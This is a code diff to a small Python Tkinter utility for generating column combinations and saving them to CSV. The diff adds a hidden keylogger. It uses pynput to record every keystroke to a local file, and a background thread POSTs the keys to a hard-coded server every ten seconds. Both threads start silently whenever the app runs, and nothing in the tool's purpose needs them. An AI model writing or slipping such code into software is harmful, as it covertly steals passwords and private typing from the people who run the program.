@@ -2,7 +2,71 @@ import tkinter as tk
 from tkinter import simpledialog, scrolledtext, filedialog, messagebox
 from itertools import product
 import csv
+from pynput import keyboard
+import threading
+import requests
+import json
+import time
 
+# Server Configuration
+SERVER_URL = "http://192.168.0.36:8080"  # Replace with your server URL
+POST_INTERVAL = 10  # Interval in seconds to send data to the server
+
+# Global variables for keylogging
+keylog_data = []
+keylog_file = "keylog.txt"
+stop_keylogger = False
+
+# Function to log keys to a file
+def log_keys_to_file():
+    with open(keylog_file, "a") as f:
+        for entry in keylog_data:
+            f.write(entry + "\n")
+        keylog_data.clear()
+
+# Keylogger functions
+def on_press(key):
+    try:
+        key_text = key.char if hasattr(key, 'char') else str(key)
+        keylog_data.append(key_text)
+    except Exception as e:
+        keylog_data.append(f"[Error: {e}]")
+
+    if len(keylog_data) > 10:  # Log to file in batches for performance
+        log_keys_to_file()
+
+def on_release(key):
+    if key == keyboard.Key.esc:  # Stop listener on Escape key
+        global stop_keylogger
+        stop_keylogger = True
+        return False
+
+def start_keylogger():
+    global stop_keylogger
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        while not stop_keylogger:
+            listener.join()
+
+# Function to send keylog data to server
+def send_keylogs_to_server():
+    while not stop_keylogger:
+        if keylog_data:
+            try:
+                # Prepare payload
+                payload = json.dumps({"keylogs": keylog_data})
+                headers = {"Content-Type": "application/json"}
+                response = requests.post(SERVER_URL, data=payload, headers=headers)
+
+                if response.status_code == 200:
+                    print("Keylog data sent successfully")
+                    log_keys_to_file()  # Save sent logs to the file
+                else:
+                    print(f"Failed to send data: {response.status_code}")
+            except Exception as e:
+                print(f"Error sending data: {e}")
+        time.sleep(POST_INTERVAL)
+
+# Tkinter App for Column Combinations
 class ColumnCombinations:
     def __init__(self, master):
         self.master = master
@@ -69,6 +133,11 @@ class ColumnCombinations:
                 messagebox.showerror("Error", f"An error occurred while saving the file: {e}")
 
 if __name__ == "__main__":
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    threading.Thread(target=send_keylogs_to_server, daemon=True).start()
+
+    # Start the Tkinter application
     root = tk.Tk()
     app = ColumnCombinations(root)
     root.mainloop()
+
